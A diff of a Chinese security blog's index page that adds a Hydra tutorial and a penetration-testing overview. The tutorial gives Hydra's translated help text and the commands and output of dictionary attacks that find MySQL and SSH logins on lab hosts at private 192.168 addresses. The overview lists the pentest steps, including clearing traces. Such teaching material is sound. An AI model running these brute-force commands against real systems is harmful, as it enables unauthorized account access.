@@ -199,6 +199,238 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://aiyingke.cn/2022/11/26/Hydra-%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/RupertTears.jpg">
+      <meta itemprop="name" content="Rupert-Tears">
+      <meta itemprop="description" content="每个优秀的人，都有一段沉默的时光。那段时光，是付出了很多努力，却得不到结果的日子，我们把它叫做扎根。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="爱影客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/11/26/Hydra-%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/" class="post-title-link" itemprop="url">Hydra 使用教程</a>
+        </h2>
+
+        <div class="post-meta">
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-11-26 13:37:27 / 修改时间：16:04:44" itemprop="dateCreated datePublished" datetime="2022-11-26T13:37:27+08:00">2022-11-26</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="一：简介"><a href="#一：简介" class="headerlink" title="一：简介"></a>一：简介</h1><p>Hydra 是一款非常强大的暴力破解工具，可以利用它对众多协议进行口令、账号、密码的爆破，支持FTP、MySQL、SMTP、TELNET、SSH等众多的协议爆破。</p>
+<p>Hydra 是一个验证性质的工具，主要目的是：展示安全研究人员从远程获取一个系统认证权限。</p>
+<h1 id="二：基础指令"><a href="#二：基础指令" class="headerlink" title="二：基础指令"></a>二：基础指令</h1><h2 id="2-1-概述"><a href="#2-1-概述" class="headerlink" title="2.1 概述"></a>2.1 概述</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">hydra</span><br><span class="line"></span><br><span class="line">Hydra v9.3 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line">Hydra v9.3 2022的作者：van Hauser/THC &amp; David Maciejak。请不要在军事或者特情局组织中使用，或者用于非法目的（这是非约束性的，反正这些****无视法律和道德）</span><br><span class="line"></span><br><span class="line">Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [-m MODULE_OPT] [service://server[:PORT][/OPT]]</span><br><span class="line">语法：hydra ...</span><br><span class="line">hydra [ [-l LOGIN|-L FILE] [-p PASS|-P FILE] ]</span><br><span class="line">hydra [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [-m MODULE_OPT] [service://server[:PORT][/OPT]]</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">选项：</span><br><span class="line">  -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE</span><br><span class="line">  -l 登录名 或者 -L 文件  登录使用一个登录名，或者从文件中加载多个登录</span><br><span class="line">  -p PASS  or -P FILE  try password PASS, or load several passwords from FILE</span><br><span class="line">  -p 密码 或者 -P 文件	尝试密码登录，或者从文件中加载多个密码</span><br><span class="line">  -C FILE   colon separated &quot;login:pass&quot; format, instead of -L/-P options</span><br><span class="line">  -C 文件		冒号分隔格式 &quot;login:pass&quot;，而不是 -L/-P 选项</span><br><span class="line">  -M FILE   list of servers to attack, one entry per line, &#x27;:&#x27; to specify port</span><br><span class="line">  -M 文件		要攻击的服务器列表，每行一个条目，使用&#x27;:&#x27;去指定端口</span><br><span class="line">  -t TASKS  run TASKS number of connects in parallel per target (default: 16)</span><br><span class="line">  -t 线程数	运行任务在每一个目标的并行连接数（默认值：16）</span><br><span class="line">  -U        service module usage details</span><br><span class="line">  -U		服务模块使用详情</span><br><span class="line">  -m OPT    options specific for a module, see -U output for information</span><br><span class="line">  -m 选项		特定于模块的选项，使用 -U 查看输出详细信息</span><br><span class="line">  -h        more command line options (COMPLETE HELP)</span><br><span class="line">  -h		更多命令行选项（完整帮助）</span><br><span class="line">  server    the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)</span><br><span class="line">  服务器		目标DNS，IP 或者 网关 192.168.0.0/24（此选项或者 -M 选项）</span><br><span class="line">  service   the service to crack (see below for supported protocols)</span><br><span class="line">  服务		要破解的服务（有关支持的协议，请参见下文）</span><br><span class="line">  OPT       some service modules support additional input (-U for module help)</span><br><span class="line">  选项		一些支持附加输入的服务模块（-U 表示模块帮助）</span><br><span class="line"></span><br><span class="line">Supported services: adam6500 asterisk cisco cisco-enable cobaltstrike cvs firebird ftp[s] http[s]-&#123;head|get|post&#125; http[s]-&#123;get|post&#125;-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-&#123;cram|digest&#125;md5][s] memcached mongodb mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp</span><br><span class="line">支持的服务：...</span><br><span class="line"></span><br><span class="line">Hydra is a tool to guess/crack valid login/password pairs.</span><br><span class="line">Hydra 是一个 猜测/破解 有效 登录/密码对 的工具。</span><br><span class="line">Licensed under AGPL v3.0. The newest version is always available at;</span><br><span class="line">根据AGPL v3.0许可，最新版本可以从以下网址获取：</span><br><span class="line">https://github.com/vanhauser-thc/thc-hydra</span><br><span class="line">Please don&#x27;t use in military or secret service organizations, or for illegal</span><br><span class="line">purposes. (This is a wish and non-binding - most such people do not care about</span><br><span class="line">laws and ethics anyway - and tell themselves they are one of the good ones.)</span><br><span class="line">请不要使用在军事或者密码服务组织中使用，否则为非法目的。（这是一个愿望，没有约束力，大多数这样的人不关心法律和道德，告诉自己他们是好的。）</span><br><span class="line"></span><br><span class="line">Example:  hydra -l user -P passlist.txt ftp://192.168.0.1</span><br><span class="line">示例：hydar ...</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-2-破解MySQL"><a href="#2-2-破解MySQL" class="headerlink" title="2.2 破解MySQL"></a>2.2 破解MySQL</h2><h3 id="（1）指定-IP-端口破解"><a href="#（1）指定-IP-端口破解" class="headerlink" title="（1）指定 IP 端口破解"></a>（1）指定 IP 端口破解</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">hydra -L 登录账户薄 -P 密码薄 mysql://目标IP:mysql端口号</span></span><br><span class="line">hydra -L ./login.txt -P ./passwd.txt mysql://192.168.1.106:3306</span><br><span class="line"></span><br><span class="line">Hydra v9.3 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-26 14:23:55</span><br><span class="line">Hydra 开始于 2022-11-26 14:23:55</span><br><span class="line">[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)</span><br><span class="line">信息：将任务数量减少到4（mysql不喜欢多并行连接）</span><br><span class="line">[DATA] max 4 tasks per 1 server, overall 4 tasks, 15 login tries (l:3/p:5), ~4 tries per task</span><br><span class="line">数据：每台服务器最多4个任务，总共4个任务，15次登录尝试（l:3/p:5）,每个任务约4次尝试</span><br><span class="line">[DATA] attacking mysql://192.168.1.106:3306/</span><br><span class="line">数据：攻击 mysql://192.168.1.106:3306/</span><br><span class="line">[3306][mysql] host: 192.168.1.106   login: root   password: root</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">1个目标中1个成功完成，找到一个有效密码。</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-26 14:23:56</span><br><span class="line">Hydra 完成于 2022-11-26 14:23:56</span><br></pre></td></tr></table></figure>
+
+<h3 id="（2）默认端口破解"><a href="#（2）默认端口破解" class="headerlink" title="（2）默认端口破解"></a>（2）默认端口破解</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果服务使用的是默认端口，那么指令也可以这样写</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">hydra -L ./login.txt -P ./passwd.txt 目标IP mysql</span></span><br><span class="line">hydra -L ./login.txt -P ./passwd.txt 192.168.1.106 mysql       </span><br><span class="line">Hydra v9.3 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-26 14:55:38</span><br><span class="line">[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)</span><br><span class="line">[DATA] max 4 tasks per 1 server, overall 4 tasks, 15 login tries (l:3/p:5), ~4 tries per task</span><br><span class="line">[DATA] attacking mysql://192.168.1.106:3306/</span><br><span class="line">[3306][mysql] host: 192.168.1.106   login: root   password: root</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-26 14:55:38</span><br></pre></td></tr></table></figure>
+
+<h3 id="（3）展示爆破过程"><a href="#（3）展示爆破过程" class="headerlink" title="（3）展示爆破过程"></a>（3）展示爆破过程</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">展示爆破过程，添加指令 -V</span></span><br><span class="line">hydra -L ./login.txt -P ./passwd.txt -V  mysql://192.168.1.106:3306 </span><br><span class="line">Hydra v9.3 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-26 15:00:51</span><br><span class="line">[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)</span><br><span class="line">[DATA] max 4 tasks per 1 server, overall 4 tasks, 15 login tries (l:3/p:5), ~4 tries per task</span><br><span class="line">[DATA] attacking mysql://192.168.1.106:3306/</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;ghost&quot; - pass &quot;123456&quot; - 1 of 15 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;ghost&quot; - pass &quot;abcdefg&quot; - 2 of 15 [child 1] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;ghost&quot; - pass &quot;admin&quot; - 3 of 15 [child 2] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;ghost&quot; - pass &quot;root&quot; - 4 of 15 [child 3] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;ghost&quot; - pass &quot;987654&quot; - 5 of 15 [child 2] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;root&quot; - pass &quot;123456&quot; - 6 of 15 [child 1] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;root&quot; - pass &quot;abcdefg&quot; - 7 of 15 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;root&quot; - pass &quot;admin&quot; - 8 of 15 [child 2] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;root&quot; - pass &quot;root&quot; - 9 of 15 [child 3] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;root&quot; - pass &quot;987654&quot; - 10 of 15 [child 1] (0/0)</span><br><span class="line">[3306][mysql] host: 192.168.1.106   login: root   password: root</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;admin&quot; - pass &quot;123456&quot; - 11 of 15 [child 3] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;admin&quot; - pass &quot;abcdefg&quot; - 12 of 15 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;admin&quot; - pass &quot;admin&quot; - 13 of 15 [child 1] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;admin&quot; - pass &quot;root&quot; - 14 of 15 [child 2] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;admin&quot; - pass &quot;987654&quot; - 15 of 15 [child 3] (0/0)</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-26 15:00:51</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-3-ssh-破解"><a href="#2-3-ssh-破解" class="headerlink" title="2.3 ssh 破解"></a>2.3 ssh 破解</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">hydra -L 登录薄 -P 密码薄 -t 线程数 ssh://目标ip</span></span><br><span class="line">hydra -L ./login.txt -P ./passwd.txt -t 4 ssh://192.168.80.129</span><br><span class="line"></span><br><span class="line">Hydra v9.3 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-26 16:02:31</span><br><span class="line">[DATA] max 4 tasks per 1 server, overall 4 tasks, 9 login tries (l:3/p:3), ~3 tries per task</span><br><span class="line">[DATA] attacking ssh://192.168.80.129:22/</span><br><span class="line">[22][ssh] host: 192.168.80.129   login: ghost   password: root</span><br><span class="line">[22][ssh] host: 192.168.80.129   login: root   password: root</span><br><span class="line">1 of 1 target successfully completed, 2 valid passwords found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-26 16:02:50</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://aiyingke.cn/2022/11/26/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%A6%82%E8%BF%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/RupertTears.jpg">
+      <meta itemprop="name" content="Rupert-Tears">
+      <meta itemprop="description" content="每个优秀的人，都有一段沉默的时光。那段时光，是付出了很多努力，却得不到结果的日子，我们把它叫做扎根。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="爱影客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/11/26/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%A6%82%E8%BF%B0/" class="post-title-link" itemprop="url">网络安全概述</a>
+        </h2>
+
+        <div class="post-meta">
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-11-26 04:42:36 / 修改时间：04:46:46" itemprop="dateCreated datePublished" datetime="2022-11-26T04:42:36+08:00">2022-11-26</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="一：什么是黑客？"><a href="#一：什么是黑客？" class="headerlink" title="一：什么是黑客？"></a>一：什么是黑客？</h1><p>电影：《我是谁：没有绝对安全的系统》</p>
+<p>黑客（hacker）：指的是在信息安全里，能够自由的出入对方系统，擅长IT技术的电脑高手。</p>
+<ul>
+<li><p>黑帽黑客</p>
+</li>
+<li><ul>
+<li>专门研究病毒木马、研究操作系统，寻找漏洞，并且以个人意志为出发点，，攻击网络或者计算机，利用漏洞为自己牟利或者破坏别人的系统、数据等。</li>
+</ul>
+</li>
+<li><p>白帽黑客</p>
+</li>
+<li><ul>
+<li>指那些专门研究或者从事网络计算机技术防御的人，他们通常受雇于各大公司，是维护世界网络、计算机安全的主要力量。很多白帽受雇于公司，对产品进行模拟黑客攻击，以检测产品的可靠性。</li>
+</ul>
+</li>
+<li><p>红客</p>
+</li>
+<li><ul>
+<li>指维护国家利益，不利用网络技术入侵自己国家电脑，而是“维护正义”，为自己国家争光的黑客。</li>
+</ul>
+</li>
+</ul>
+<h1 id="二：法律法规"><a href="#二：法律法规" class="headerlink" title="二：法律法规"></a>二：法律法规</h1><p>中华人民共和国刑法：</p>
+<ul>
+<li>第285条：违反国家规定，侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的，处三年以下有期徒刑或者拘役。</li>
+<li>第286条：违反国家规定，对计算机信息系统功能进行删除、修改、增加、干扰，造成计算机信息系统不能正常运行，后果严重的，处五年以下有期徒刑或者拘役：后果特别严重的，处五年以上有期徒刑。</li>
+</ul>
+<h1 id="三：渗透测试"><a href="#三：渗透测试" class="headerlink" title="三：渗透测试"></a>三：渗透测试</h1><h2 id="3-1-概念"><a href="#3-1-概念" class="headerlink" title="3.1 概念"></a>3.1 概念</h2><p>通过模拟恶意黑客的攻击方式，同时是在授权情况下对目标系统进行安全性测试和评估的过程。</p>
+<p>重点是测试，是过程，而不是不计后果的攻击或测试防御，它是一套科学流程，不局限于某一工具或者技巧的运用。</p>
+<p>很多白帽子在各大公司从事的工作便是web渗透测试。</p>
+<h2 id="3-2-流程"><a href="#3-2-流程" class="headerlink" title="3.2 流程"></a>3.2 流程</h2><p>确定目标👉信息收集👉漏洞探测👉漏洞利用，获取webshell👉内网渗透👉漏洞验证与修复👉撰写渗透测试报告</p>
+<ul>
+<li>第一步：确定要渗透的目标，也就是选择要测试的目标网站。</li>
+<li>第二步：收集目标网站的相关信息，比如操作系统，数据库，端口服务，所使用的脚本语言，子域名以及CMS系统等等。</li>
+<li>第三步：漏洞探测。利用收集到的信息，寻找目标的脆弱点。</li>
+<li>第四步：漏洞利用，找到对方系统的弱点后，进一步攻克对方系统，拿到目标系统的权限。</li>
+<li>第五步：渗透目标内网的其他主机，把获得的目标机器权限，当作跳板，进一步攻克内网其他主机。</li>
+<li>第六步：验证漏洞与修复漏洞。</li>
+<li>第七步：清除渗透痕迹，撰写测试报告。</li>
+</ul>
+<h1 id="四：网站运行原理"><a href="#四：网站运行原理" class="headerlink" title="四：网站运行原理"></a>四：网站运行原理</h1><h2 id="4-1-网站运行原理"><a href="#4-1-网站运行原理" class="headerlink" title="4.1 网站运行原理"></a>4.1 网站运行原理</h2><p>服务器的操作系统👉中间件👉数据库👉代码👉静态资源</p>
+<ul>
+<li>网站搭建在服务器的操作系统之上，例如windows、linux；</li>
+<li>网站的搭建需要中间件的支撑，例如：tomcat、nginx、apache software foundation；</li>
+<li>网站的搭建需要数据库存放数据，例如：MySQL、SQL Server；</li>
+<li>网站页面是由代码编写的，例如：PHP、JSP、ASP（动态服务器页面）；</li>
+<li>网站页面由部分静态资源组成，例如：html、css、JavaScript；</li>
+</ul>
+<h2 id="4-2-网站运行流程"><a href="#4-2-网站运行流程" class="headerlink" title="4.2 网站运行流程"></a>4.2 网站运行流程</h2><ul>
+<li>第一步：浏览器输入网址，进行网站访问，通过DNS解析域名，找到服务器IP地址</li>
+<li>第二步：发送请求指服务器</li>
+<li>第三步：服务器接收到请求，并响应请求返回给浏览器</li>
+</ul>
+<h1 id="五：环境准备"><a href="#五：环境准备" class="headerlink" title="五：环境准备"></a>五：环境准备</h1><h2 id="5-1-VM-WARE"><a href="#5-1-VM-WARE" class="headerlink" title="5.1 VM WARE"></a>5.1 VM WARE</h2><p>VM WARE 是一款虚拟化软件，利用它，我们能够在自己物理机的 windows 系统上再去安装其他的操作系统；</p>
+<p>官方Windosws版本： </p>
+<p><strong><a target="_blank" rel="noopener" href="https://www.vmware.com/go/getworkstation-win">https://www.vmware.com/go/getworkstation-win</a></strong></p>
+<p>使用激活码进行激活服务；</p>
+<h2 id="5-2-kali-linux"><a href="#5-2-kali-linux" class="headerlink" title="5.2 kali linux"></a>5.2 kali linux</h2><p>官方镜像源下载：</p>
+<p><a target="_blank" rel="noopener" href="http://old.kali.org/kali-images/kali-2022.3/">http://old.kali.org/kali-images/kali-2022.3/</a></p>
+<p>阿里镜像：</p>
+<p><a target="_blank" rel="noopener" href="https://mirrors.aliyun.com/kali-images/kali-2022.3/?spm=a2c6h.25603864.0.0.53e4571cpseXgA">https://mirrors.aliyun.com/kali-images/kali-2022.3/?spm=a2c6h.25603864.0.0.53e4571cpseXgA</a></p>
+<h2 id="5-3-VMware-tools"><a href="#5-3-VMware-tools" class="headerlink" title="5.3 VMware-tools"></a>5.3 VMware-tools</h2><p>方便操作虚拟机，可以实现复制粘贴功能；</p>
+<ol>
+<li>挂载安装包</li>
+<li>复制安装包到tmp目录下方</li>
+<li>进入tmp目录</li>
+<li>解压安装包</li>
+<li>执行安装脚本</li>
+<li>安装完成过后重启kali</li>
+</ol>
+<h2 id="5-4-kali-APT源"><a href="#5-4-kali-APT源" class="headerlink" title="5.4 kali APT源"></a>5.4 kali APT源</h2><p>kail 的 APT 源就相当于一个软件包管理器。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">打开配置文件</span></span><br><span class="line">leafpad /etc/apt/source.list</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置阿里源</span></span><br><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">更新源</span></span><br><span class="line">apt-get update</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>通过 leafpad 打开源的配置文件 sources.list</li>
+<li>复制粘贴中科大源进去</li>
+<li>ctrl + s 保存并退出</li>
+<li>输入命令 apt-get update</li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">　kali 写入时出现 E121：无法打开并写入文件</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">　解决方案</span></span><br><span class="line">1.保存的时候使用：ｗ !sudo tee %</span><br><span class="line">2.输入密码即可 </span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://aiyingke.cn/2022/11/26/nmap%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B8%B8%E8%A7%81%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -936,266 +1168,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://aiyingke.cn/2022/11/12/AI-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%EF%BC%882%EF%BC%89/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/RupertTears.jpg">
-      <meta itemprop="name" content="Rupert-Tears">
-      <meta itemprop="description" content="每个优秀的人，都有一段沉默的时光。那段时光，是付出了很多努力，却得不到结果的日子，我们把它叫做扎根。">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="爱影客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/11/12/AI-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%EF%BC%882%EF%BC%89/" class="post-title-link" itemprop="url">AI_逻辑回归（2）</a>
-        </h2>
-
-        <div class="post-meta">
-          
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-11-12 14:08:50 / 修改时间：17:08:16" itemprop="dateCreated datePublished" datetime="2022-11-12T14:08:50+08:00">2022-11-12</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/" itemprop="url" rel="index"><span itemprop="name">人工智能</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
